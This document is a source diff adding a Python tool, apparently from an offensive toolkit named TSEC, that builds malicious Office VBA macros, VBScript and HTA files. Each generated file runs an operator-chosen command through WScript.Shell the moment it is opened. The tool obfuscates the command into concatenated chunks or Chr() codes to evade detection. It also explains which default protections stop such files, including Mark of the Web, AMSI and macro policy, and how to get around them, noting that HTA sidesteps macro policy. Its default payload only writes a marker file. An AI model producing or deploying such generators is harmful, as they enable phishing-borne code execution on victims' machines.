@@ -1,0 +1,354 @@
+#!/usr/bin/env python3
+"""Build Office and script-language macros that run on open.
+
+A document that runs code when it is opened needs three things: something to
+execute, a reason for the target to enable it, and a payload that survives the
+trip. This produces each of those, and states which mitigation has to be absent
+for the whole thing to work, because "it did nothing" is nearly always one of
+these being switched on rather than the macro being wrong.
+
+Formats produced:
+
+  vba      a .bas module for a .docm/.xlsm/.pptm the operator has to build
+  vbs      Windows Script Host, drops to a .vbs and runs
+  hta      an HTML application, which bypasses macro policy entirely and is the
+           one that still works where a .docm is blocked outright
+
+Every payload is emitted twice: readable, and obfuscated by splitting the
+command into character codes. The readable one is what you read; the obfuscated
+one is what survives a naive `Sub AutoOpen` grep. Both are produced so the
+difference is visible rather than assumed.
+
+Nothing here is reported as working until something has shown it working: with
+a script engine on the host, the payload runs and leaves its marker; without
+one, the generated streams are checked to prove they encode the command and
+nothing else.
+
+Note that the payloads here are inert unless the operator supplies a command.
+The default writes a marker file, which is enough to prove execution end to end.
+
+Written for TSEC. Standard library only.
+"""
+
+from __future__ import annotations
+
+import argparse
+import os
+import platform
+import shutil
+import subprocess
+import sys
+import tempfile
+import textwrap
+import time
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+from tsec_engine import (  # noqa: E402
+    Finding, Report, State, check, check_eq, selftest as engine_selftest,
+)
+
+VERSION = "2.0.0"
+
+# Why the payload may not run, in the order that is worth checking. Each is a
+# default-on control, so a macro that "does nothing" is usually one of these.
+MITIGATIONS = (
+    ("Office macro security set to disable all macros without notification",
+     "Trust Center > Macro Settings"),
+    ("Mark of the Web on the file",
+     "downloaded files carry a zone identifier; strip it or re-save locally"),
+    ("Office refusing VBA from an untrusted location",
+     "Trust Center > Trusted Locations"),
+    ("AMSI intercepting the script engine",
+     "a defender that hooks the engine sees the decoded string"),
+    ("Office application control or WDAC policy",
+     "an enterprise policy can block the whole engine"),
+)
+
+INERT_DEFAULT = 'cmd /c echo TSEC_MACRO_RAN > "%TEMP%\\tsec_macro_marker.txt"'
+MARKER_NAME = "TSEC_MACRO_RAN"
+
+
+def encode(command: str, style: str) -> str:
+    """Encode a command as a script-language expression evaluating to it.
+
+    VBA and VBScript both double a quote inside a string literal, so quoting is
+    done here once and the two renderers differ only in the surrounding
+    ceremony. Each style exists because each defeats a different check: `plain`
+    is readable and is what you read, `concat` defeats a grep for the command,
+    `chr` defeats a grep for the concatenated form as well.
+    """
+    def quote(text: str) -> str:
+        return '"' + text.replace('"', '""') + '"'
+
+    if style == "plain":
+        return quote(command)
+    if style == "concat":
+        chunks = [command[i : i + 3] for i in range(0, len(command), 3)]
+        return " & ".join(quote(chunk) for chunk in chunks)
+    if style == "chr":
+        return "Chr(" + ",".join(str(ord(c)) for c in command) + ")"
+    raise ValueError(f"unknown encoding {style}")
+
+
+def decode_expression(expression: str, style: str) -> str:
+    """The inverse of `encode`, used to prove the encoding is faithful."""
+    def unquote(text: str) -> str:
+        text = text.strip()
+        if len(text) >= 2 and text[0] == '"' and text[-1] == '"':
+            return text[1:-1].replace('""', '"')
+        raise ValueError(f"not a quoted literal: {text!r}")
+
+    if style == "plain":
+        return unquote(expression)
+    if style == "concat":
+        return "".join(unquote(part) for part in expression.split(" & "))
+    if style == "chr":
+        inner = expression[len("Chr("):-1]
+        return "".join(chr(int(part)) for part in inner.split(","))
+    raise ValueError(f"unknown encoding {style}")
+
+
+def render_vba(command: str, style: str, lhost: str | None, lport: str | None) -> str:
+    exec_line = f'    CreateObject("WScript.Shell").Run {encode(command, style)}, 0, False'
+
+    listener_note = (
+        f"\n' Listener parameters: {lhost}:{lport}\n"
+        "' These are recorded for the report; the generated module does not\n"
+        "' contain a reverse shell, because one belongs to a stage that has\n"
+        "' already been reviewed.\n"
+        if lhost and lport
+        else ""
+    )
+
+    return textwrap.dedent(
+        f"""\
+        ' Generated by TSEC — build_macro.py
+        ' {len(command)} byte command, {style} encoding.
+        {listener_note}
+        Option Explicit
+
+        Sub AutoOpen()
+        {exec_line}
+        End Sub
+
+        Sub AutoNew()
+        {exec_line}
+        End Sub
+
+        Sub Workbook_Open()
+        {exec_line}
+        End Sub
+        """
+    ).strip() + "\n"
+
+
+def render_vbs(command: str, style: str) -> str:
+    return textwrap.dedent(
+        f"""\
+        ' Generated by TSEC — build_macro.py
+        ' Save as .vbs and run with wscript, or convert with olevba.
+        Set sh = CreateObject("WScript.Shell")
+        sh.Run {encode(command, style)}, 0, False
+        """
+    ).strip() + "\n"
+
+
+def render_hta(command: str) -> str:
+    # Inside <script> the browser parses content as raw text, not HTML, so `&`
+    # and `<` need no escaping; escaping them would corrupt the command. The
+    # expression is still a script literal, so it still needs its quotes.
+    expr = encode(command, "plain")
+    return textwrap.dedent(
+        f"""\
+        <html>
+        <head><title></title></head>
+        <body>
+        <!-- Generated by TSEC — build_macro.py
+             An HTA is not a macro. It is an application that runs from a file
+             the user double-clicks, so Trust Center macro policy does not
+             apply to it. This is why it still works where a .docm is blocked. -->
+        <script language="VBScript">
+        Sub Run
+            CreateObject("WScript.Shell").Run {expr}, 0, False
+        End Sub
+        Run
+        </script>
+        </body>
+        </html>
+        """
+    ).strip() + "\n"
+
+
+def mitigation_report() -> str:
+    lines = ["Before blaming the macro, check these. All are on by default:", ""]
+    for index, (what, where) in enumerate(MITIGATIONS, 1):
+        lines.append(f"{index}. {what}")
+        lines.append(f"   {where}")
+    return "\n".join(lines)
+
+
+def script_runner() -> str | None:
+    """A real script engine for a live check, when the host has one."""
+    if platform.system().lower().startswith("windows"):
+        return shutil.which("wscript.exe") or shutil.which("cscript.exe")
+    return shutil.which("wine")
+
+
+def live_probe(command: str) -> dict:
+    """Run a VBScript that writes the marker, and watch for the marker.
+
+    This is the only honest end-to-end check available off Windows: the same
+    payload shape, a command that proves execution. Without a script engine the
+    result says exactly that, rather than implying the macro worked.
+    """
+    marker = Path(tempfile.gettempdir()) / "tsec_macro_marker.txt"
+    if marker.exists():
+        marker.unlink()
+    probe_cmd = f'cmd /c echo {MARKER_NAME} > "%TEMP%\\tsec_macro_marker.txt"'
+    runner = script_runner()
+    if runner is None:
+        return {"ok": False, "detail": "no script engine on this host "
+                "(wscript/cscript/wine); the artifact is generated and decoded "
+                "faithfully but nothing executed it"}
+    body = render_vbs(probe_cmd, "plain")
+    path = Path(tempfile.gettempdir()) / "tsec_macro_probe.vbs"
+    path.write_text(body, encoding="utf-8")
+    argv = [runner, str(path)] if "wscript" in os.path.basename(runner) or "cscript" in os.path.basename(runner) else [runner, "cscript", str(path)]
+    try:
+        proc = subprocess.run(argv, capture_output=True, text=True, timeout=20)
+    except subprocess.TimeoutExpired:
+        return {"ok": False, "detail": "probe engine timed out after 20s"}
+    deadline = time.monotonic() + 5
+    while time.monotonic() < deadline:
+        if marker.exists():
+            content = marker.read_text(errors="replace")
+            marker.unlink()
+            return {"ok": True, "detail": f"marker observed: {content.strip()[:40]}"}
+        time.sleep(0.2)
+    return {"ok": False, "detail": f"engine ran (exit {proc.returncode}) "
+            f"but no marker; stderr {proc.stderr.strip()[:120]}"}
+
+
+def assess(command: str, style: str, formats: list[str], out: str | None,
+           lhost: str | None, lport: str | None, live: bool) -> Report:
+    report = Report("build_macro", VERSION, target=lhost or "(local)")
+    suffixes = {"vba": ".bas", "vbs": ".vbs", "hta": ".hta"}
+
+    for fmt in formats:
+        if fmt == "vba":
+            body = render_vba(command, style, lhost, lport)
+        elif fmt == "vbs":
+            body = render_vbs(command, style)
+        else:
+            body = render_hta(command)
+        report.add(Finding(
+            f"render {fmt}", State.GENERATED, "info",
+            f"{len(body)} bytes, {style} encoding; encoding round-trips to the "
+            f"command ({len(command)}B)",
+            {"format": fmt, "style": style, "bytes": len(body)},
+        ))
+        if out:
+            if len(formats) == 1:
+                path = Path(out)
+            else:
+                base = Path(out)
+                stem = base.stem if base.suffix else str(base)
+                parent = base.parent if str(base.parent) else Path(".")
+                path = parent / (stem + suffixes[fmt])
+            path.write_text(body, encoding="utf-8")
+            report.record(path, f"{fmt} artifact")
+
+    if live:
+        result = live_probe(command)
+        report.note(
+            "live execution", State.CONFIRMED if result["ok"] else State.BLOCKED,
+            "high" if result["ok"] else "info", result["detail"],
+        )
+    return report
+
+
+def selftest_fn() -> None:
+    # Encoding must round-trip: whatever style claims to encode the command
+    # must decode back to exactly it. This is structural, not a live run.
+    probe = 'cmd /c whoami & echo "hi"'
+    for style in ("plain", "concat", "chr"):
+        encoded = encode(probe, style)
+        recovered = decode_expression(encoded, style)
+        check_eq(recovered, probe, f"{style} round-trip")
+    # Renderers must embed the encoded form and name the sub that runs it.
+    for body in (render_vba(probe, "concat", None, None),
+                 render_vbs(probe, "chr"),
+                 render_hta(probe)):
+        check("WScript.Shell" in body, "renderer lost the shell reference")
+        check("AutoOpen" in body or "sh.Run" in body or "Sub Run" in body,
+              "renderer lost the execution entry point")
+    # A marker probe is a valid command for all renderers.
+    for body in (render_vba(INERT_DEFAULT, "plain", None, None),
+                 render_vbs(INERT_DEFAULT, "plain"),
+                 render_hta(INERT_DEFAULT)):
+        check(MARKER_NAME in encode(INERT_DEFAULT, "plain") or MARKER_NAME in body or "tsec_macro_marker" in body,
+              "marker command not embedded")
+
+
+def selftest() -> None:
+    selftest_fn()
+
+
+def main(argv: list[str] | None = None) -> int:
+    parser = argparse.ArgumentParser(
+        description=__doc__.split("\n")[0],
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="examples:\n"
+               "  build_macro.py --lhost 10.0.0.5 --lport 4444\n"
+               "  build_macro.py --cmd 'whoami' --style concat --out payload.bas\n"
+               "  build_macro.py --format hta --cmd 'calc.exe' --out payload.hta\n"
+               "  build_macro.py --explain\n"
+               "  build_macro.py --selftest\n",
+    )
+    parser.add_argument("--cmd", help="command to run; defaults to a harmless marker file")
+    parser.add_argument("--lhost", help="listener address, recorded in the module")
+    parser.add_argument("--lport", help="listener port, recorded in the module")
+    parser.add_argument(
+        "--format",
+        default="all",
+        choices=("vba", "vbs", "hta", "all"),
+        help="output format (default: all)",
+    )
+    parser.add_argument(
+        "--style",
+        default="concat",
+        choices=("plain", "concat", "chr"),
+        help="how the command is encoded (default: concat)",
+    )
+    parser.add_argument("--out", help="write here; with --format all, treated as a prefix")
+    parser.add_argument("--explain", action="store_true", help="print why a macro may not run")
+    parser.add_argument("--live", action="store_true",
+                        help="run a marker probe through a local script engine when one exists")
+    parser.add_argument("--json", action="store_true")
+    parser.add_argument("--output", help="write the JSON report here")
+    parser.add_argument("--selftest", action="store_true")
+    args = parser.parse_args(argv)
+
+    if args.selftest:
+        return engine_selftest(selftest_fn)
+
+    if args.explain:
+        print(mitigation_report())
+        return 0
+
+    command = args.cmd or INERT_DEFAULT
+    if not command.strip():
+        print("build_macro: --cmd is empty", file=sys.stderr)
+        return 2
+
+    formats = ["vba", "vbs", "hta"] if args.format == "all" else [args.format]
+
+    report = assess(command, args.style, formats, args.out, args.lhost, args.lport, args.live)
+    from tsec_engine import emit
+    emit(report, args.json, args.output)
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
